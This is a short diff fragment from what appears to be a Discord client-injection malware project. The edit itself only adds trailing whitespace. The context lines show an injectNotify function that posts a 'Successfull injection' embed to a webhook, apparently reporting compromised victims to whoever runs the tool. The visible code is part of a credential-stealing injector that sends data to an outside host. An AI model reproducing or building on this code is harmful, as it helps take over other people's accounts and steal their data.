@@ -163,7 +163,7 @@ function injectNotify() {
     })
     axios
 	.post(webhook, {
-        "content": null,
+        "content": null, 
         "embeds": [
           {
             "title": "<:bfdnonsfw:966774651449671761> Successfull injection",
